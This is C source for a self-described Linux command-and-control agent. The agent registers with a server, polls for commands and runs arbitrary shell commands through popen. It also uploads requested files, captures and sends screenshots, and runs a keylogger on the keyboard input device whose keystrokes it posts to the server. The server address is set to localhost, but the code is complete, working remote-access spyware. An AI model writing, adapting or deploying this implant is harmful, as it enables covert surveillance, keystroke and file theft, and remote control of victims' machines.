// agent_linux.c - Linux C2 agent
// Compile with: gcc agent_linux.c -o agent_linux -lcurl -lpthread
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <curl/curl.h>
#include <pthread.h>
#include <dirent.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <linux/input.h>
#include <time.h>
#include <regex.h>

#define SERVER_URL "http://localhost:8080"
#define AGENT_ID   "linuxagent1"

char current_dir[512] = {0};
volatile int keylogger_running = 0;
char keylog_buffer[4096] = {0};
size_t keylog_len = 0;

struct MemoryStruct {
    char *memory;
    size_t size;
};

size_t WriteMemoryCallback(void *contents, size_t size, size_t nmemb, void *userp) {
    size_t realsize = size * nmemb;
    struct MemoryStruct *mem = (struct MemoryStruct *)userp;
    mem->memory = realloc(mem->memory, mem->size + realsize + 1);
    if(mem->memory == NULL) return 0;
    memcpy(&(mem->memory[mem->size]), contents, realsize);
    mem->size += realsize;
    mem->memory[mem->size] = 0;
    return realsize;
}

void register_agent() {
    CURL *curl = curl_easy_init();
    if (!curl) return;
    char data[256];
    snprintf(data, sizeof(data),
        "{\"agentId\":\"%s\",\"agentIp\":\"127.0.0.1\",\"agentOs\":\"Linux\",\"agentStatus\":\"ACTIVE\"}",
        AGENT_ID);
    struct curl_slist *headers = NULL;
    headers = curl_slist_append(headers, "Content-Type: application/json");
    curl_easy_setopt(curl, CURLOPT_URL, SERVER_URL "/agents");
    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, data);
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
    curl_easy_setopt(curl, CURLOPT_POST, 1L);
    curl_easy_perform(curl);
    curl_slist_free_all(headers);
    curl_easy_cleanup(curl);
}

void upload_file(const char* filepath) {
    CURL *curl = curl_easy_init();
    if (!curl) return;

    curl_mime *mime;
    curl_mimepart *part;

    mime = curl_mime_init(curl);

    // Add file part
    part = curl_mime_addpart(mime);
    curl_mime_name(part, "file");
    curl_mime_filedata(part, filepath);

    // Add agentId part
    part = curl_mime_addpart(mime);
    curl_mime_name(part, "agentId");
    curl_mime_data(part, AGENT_ID, CURL_ZERO_TERMINATED);

    curl_easy_setopt(curl, CURLOPT_URL, SERVER_URL "/files/upload");
    curl_easy_setopt(curl, CURLOPT_MIMEPOST, mime);
    curl_easy_perform(curl);

    curl_mime_free(mime);
    curl_easy_cleanup(curl);
}

void take_screenshot(char* outpath, size_t outsize) {
    time_t t = time(NULL);
    struct tm *tm_info = localtime(&t);
    char filename[128];
    strftime(filename, sizeof(filename), "screenshot_%Y%m%d_%H%M%S.png", tm_info);
    snprintf(outpath, outsize, "%s", filename);
    char cmd[256];
    snprintf(cmd, sizeof(cmd), "scrot %s", filename);
    system(cmd);
}

void list_directory(const char* path, char* out, size_t outsize) {
    DIR *dir = opendir(path);
    if (!dir) {
        snprintf(out, outsize, "Failed to open directory: %s", path);
        return;
    }
    struct dirent *entry;
    size_t len = 0;
    while ((entry = readdir(dir)) != NULL && len < outsize - 128) {
        len += snprintf(out + len, outsize - len, "%s\n", entry->d_name);
    }
    closedir(dir);
}

void list_processes(char* out, size_t outsize) {
    FILE *fp = popen("ps -ef", "r");
    if (fp) {
        fread(out, 1, outsize-1, fp);
        pclose(fp);
    } else {
        snprintf(out, outsize, "Failed to list processes");
    }
}

// Find the first /dev/input/eventX device with 'kbd' in /proc/bus/input/devices
void find_keyboard_device(char *out, size_t outsize) {
    FILE *fp = fopen("/proc/bus/input/devices", "r");
    if (!fp) {
        snprintf(out, outsize, "/dev/input/event0");
        return;
    }
    char line[256];
    char event[32] = "";
    int found_kbd = 0;
    while (fgets(line, sizeof(line), fp)) {
        if (strstr(line, "kbd")) found_kbd = 1;
        if (found_kbd && strstr(line, "Handlers=")) {
            char *p = strstr(line, "event");
            if (p) {
                sscanf(p, "event%31s", event);
                char *end = event;
                while (*end && ((*end >= '0' && *end <= '9'))) end++;
                *end = 0;
                snprintf(out, outsize, "/dev/input/event%s", event);
                fclose(fp);
                return;
            }
        }
        if (line[0] == '\n') found_kbd = 0;
    }
    fclose(fp);
    snprintf(out, outsize, "/dev/input/event0"); // fallback
}

void* keylogger_thread(void* arg) {
    int fd = open("/dev/input/event0", O_RDONLY);
    if (fd < 0) {
        fprintf(stderr, "[!] Could not open keyboard device: /dev/input/event0\n");
        return NULL;
    }
    struct input_event ev;
    while (keylogger_running) {
        if (read(fd, &ev, sizeof(ev)) > 0 && ev.type == EV_KEY && ev.value == 1) {
            printf("Key event: code=%d\n", ev.code);
            if (keylog_len < sizeof(keylog_buffer)-2) {
                keylog_buffer[keylog_len++] = (char)ev.code;
                keylog_buffer[keylog_len] = 0;
            }
        }
    }
    close(fd);
    return NULL;
}
void start_keylogger() {
    keylogger_running = 1;
    pthread_t tid;
    pthread_create(&tid, NULL, keylogger_thread, NULL);
}
void stop_keylogger() {
    keylogger_running = 0;
}
void upload_keylog() {
    if (keylog_len == 0) return;
    printf("Uploading keylog: %s\n", keylog_buffer);
    CURL *curl = curl_easy_init();
    if (!curl) return;
    char post[8192];
    snprintf(post, sizeof(post), "{\"agentId\":\"%s\",\"logText\":\"%s\"}", AGENT_ID, keylog_buffer);
    struct curl_slist *headers = NULL;
    headers = curl_slist_append(headers, "Content-Type: application/json");
    char url[256];
    snprintf(url, sizeof(url), "%s/keylogger/log", SERVER_URL);
    curl_easy_setopt(curl, CURLOPT_URL, url);
    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, post);
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
    curl_easy_setopt(curl, CURLOPT_POST, 1L);
    curl_easy_perform(curl);
    curl_slist_free_all(headers);
    curl_easy_cleanup(curl);
    keylog_len = 0;
    keylog_buffer[0] = 0;
}

void fetch_and_execute() {
    CURL *curl = curl_easy_init();
    if (!curl) return;
    char url[256];
    snprintf(url, sizeof(url), "%s/commands/agents/%s/pending", SERVER_URL, AGENT_ID);
    struct MemoryStruct chunk = { malloc(1), 0 };
    curl_easy_setopt(curl, CURLOPT_URL, url);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteMemoryCallback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, (void *)&chunk);
    curl_easy_perform(curl);
    char *cmd = strstr(chunk.memory, "\"command\":");
    char *cid = strstr(chunk.memory, "\"commandId\":");
    if (cmd && cid) {
        char command[256] = {0}, commandId[64] = {0};
        sscanf(cmd, "\"command\":\"%255[^\"]\"", command);
        sscanf(cid, "\"commandId\":\"%63[^\"]\"", commandId);
        if (strlen(command) > 0 && strlen(commandId) > 0) {
            printf("[*] Executing: %s\n", command);
            char result[4096] = {0};
            if (strncmp(command, "fetch_file ", 11) == 0) {
                const char* filepath = command + 11;
                upload_file(filepath);
                snprintf(result, sizeof(result), "File upload attempted: %s", filepath);
            } else if (strcmp(command, "screenshot") == 0) {
                char screenshot_path[256];
                take_screenshot(screenshot_path, sizeof(screenshot_path));
                struct stat st;
                if (stat(screenshot_path, &st) == 0) {
                    // Base64 encode the screenshot
                    char base64file[512];
                    snprintf(base64file, sizeof(base64file), "%s.b64", screenshot_path);
                    char cmd[1024];
                    snprintf(cmd, sizeof(cmd), "base64 %s > %s", screenshot_path, base64file);
                    system(cmd);
                    FILE *b64 = fopen(base64file, "r");
                    fseek(b64, 0, SEEK_END);
                    long b64size = ftell(b64);
                    rewind(b64);
                    char *b64data = malloc(b64size + 1);
                    fread(b64data, 1, b64size, b64);
                    b64data[b64size] = 0;
                    fclose(b64);
                    // Prepare JSON
                    char *json = malloc(b64size + 256);
                    snprintf(json, b64size + 256, "{\"agentId\":\"%s\",\"screenshotData\":\"%s\"}", AGENT_ID, b64data);
                    // Upload to /screenshots/upload
                    CURL *scurl = curl_easy_init();
                    struct curl_slist *headers = NULL;
                    headers = curl_slist_append(headers, "Content-Type: application/json");
                    curl_easy_setopt(scurl, CURLOPT_URL, SERVER_URL "/screenshots/upload");
                    curl_easy_setopt(scurl, CURLOPT_POSTFIELDS, json);
                    curl_easy_setopt(scurl, CURLOPT_HTTPHEADER, headers);
                    curl_easy_perform(scurl);
                    curl_slist_free_all(headers);
                    curl_easy_cleanup(scurl);
                    snprintf(result, sizeof(result), "Screenshot taken: %s", screenshot_path);
                    remove(screenshot_path);
                    remove(base64file);
                    free(b64data);
                    free(json);
                } else {
                    snprintf(result, sizeof(result), "Screenshot failed");
                }
            } else if (strcmp(command, "start_keylogger") == 0) {
                start_keylogger();
                snprintf(result, sizeof(result), "Keylogger started");
            } else if (strcmp(command, "stop_keylogger") == 0) {
                stop_keylogger();
                snprintf(result, sizeof(result), "Keylogger stopped");
            } else if (strncmp(command, "cd ", 3) == 0) {
                const char* path = command + 3;
                if (chdir(path) == 0) {
                    getcwd(current_dir, sizeof(current_dir));
                    snprintf(result, sizeof(result), "Changed directory to %s", current_dir);
                } else {
                    snprintf(result, sizeof(result), "Failed to change directory");
                }
            } else if (strncmp(command, "list_dir ", 9) == 0) {
                const char* path = command + 9;
                list_directory(path, result, sizeof(result));
            } else if (strcmp(command, "list_processes") == 0) {
                list_processes(result, sizeof(result));
            } else {
                char prev_dir[512] = {0};
                getcwd(prev_dir, sizeof(prev_dir));
                if (strlen(current_dir) > 0) chdir(current_dir);
                FILE *fp = popen(command, "r");
                if (fp) {
                    fread(result, 1, sizeof(result)-1, fp);
                    pclose(fp);
                } else {
                    strcpy(result, "[error running command]");
                }
                chdir(prev_dir);
            }
            CURL *rcurl = curl_easy_init();
            if (rcurl) {
                char post[8192];
                snprintf(post, sizeof(post), "agentId=%s&commandId=%s&resultText=%s", AGENT_ID, commandId, result);
                curl_easy_setopt(rcurl, CURLOPT_URL, SERVER_URL "/results/save");
                curl_easy_setopt(rcurl, CURLOPT_POSTFIELDS, post);
                curl_easy_perform(rcurl);
                curl_easy_cleanup(rcurl);
            }
            CURL *scurl = curl_easy_init();
            if (scurl) {
                char surl[256];
                snprintf(surl, sizeof(surl), "%s/commands/assign/%s/EXECUTED", SERVER_URL, commandId);
                curl_easy_setopt(scurl, CURLOPT_URL, surl);
                curl_easy_setopt(scurl, CURLOPT_CUSTOMREQUEST, "PUT");
                curl_easy_perform(scurl);
                curl_easy_cleanup(scurl);
            }
        }
    }
    free(chunk.memory);
    curl_easy_cleanup(curl);
}

int main() {
    curl_global_init(CURL_GLOBAL_ALL);
    register_agent();
    getcwd(current_dir, sizeof(current_dir));
    int keylog_tick = 0;
    while (1) {
        fetch_and_execute();
        if (keylogger_running) {
            keylog_tick++;
            if (keylog_tick >= 10) {
                upload_keylog();
                keylog_tick = 0;
            }
        }
        sleep(1);
    }
    curl_global_cleanup();
    return 0;
} 